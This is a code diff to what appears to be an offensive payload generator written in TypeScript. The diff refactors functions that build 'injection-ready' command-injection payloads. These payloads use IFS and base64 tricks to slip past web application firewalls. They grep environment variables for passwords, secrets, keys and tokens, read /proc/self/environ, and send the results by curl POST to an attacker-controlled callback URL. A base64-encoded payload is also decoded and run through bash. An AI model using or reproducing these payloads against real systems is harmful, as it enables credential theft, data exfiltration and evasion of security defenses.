@@ -500,6 +500,12 @@ export function buildSsrfExfil(cbUrl: string, token: string): ExfilPayload[] {
 /* ── Injection-ready exfil (works inside HTTP injection param directly) ── */
 export function buildInjectionReadyExfilWrapped(cbUrl: string, token: string): ExfilPayload[] {
   const cb = `${cbUrl}/${token}`;
+  const ifsToken = "${IFS}";
+  const ifsEnvCmd = `$(env|grep${ifsToken}-iE${ifsToken}'(pass|secret|key|token)')|curl${ifsToken}-sk${ifsToken}-X${ifsToken}POST${ifsToken}"${cb}?f=ifs_env"${ifsToken}--data-binary${ifsToken}@-)`;
+  const b64Inner = Buffer.from(
+    `(id;hostname;cat /proc/self/environ|tr '\\0' '\\n')|curl -sk -X POST "${cb}?f=b64_exfil" --data-binary @-`
+  ).toString('base64');
+  const b64ExfilCmd = `$({echo,${b64Inner}}|{base64,-d}|{bash,})`;
   return [
     {
       id: "inj_ready_passwd", name: "✦ INJECT-READY: /etc/passwd → OOB", category: "Injection-Ready",
@@ -522,13 +528,13 @@ export function buildInjectionReadyExfilWrapped(cbUrl: string, token: string): E
     {
       id: "inj_ready_ifs", name: "✦ INJECT-READY (IFS bypass): ENV → OOB", category: "Injection-Ready",
       technique: "http", os: "linux",
-      command: `$(env|grep${" -iE".replace(/ /g,"${IFS}")}${" '(pass|secret|key|token)'")|curl${" -sk".replace(/ /g,"${IFS}")}${" -X".replace(/ /g,"${IFS}")}${" POST".replace(/ /g,"${IFS}")}${" ".replace(/ /g,"${IFS}")}${`"${cb}?f=ifs_env"`}${" --data-binary".replace(/ /g,"${IFS}")}${" @-".replace(/ /g,"${IFS}")})`,
+      command: ifsEnvCmd,
       notes: "IFS-bypassed version for WAFs that block spaces in injection params.",
     },
     {
       id: "inj_ready_b64", name: "✦ INJECT-READY (B64 bypass): Full Exfil", category: "Injection-Ready",
       technique: "http", os: "linux",
-      command: `$({echo,${Buffer.from(`(id;hostname;cat /proc/self/environ|tr '\\0' '\\n')|curl -sk -X POST "${cb}?f=b64_exfil" --data-binary @-`).toString('base64')}}|{base64,-d}|{bash,})`,
+      command: b64ExfilCmd,
       notes: "Base64-encoded injection — bypasses keyword-based WAFs.",
     },
     {
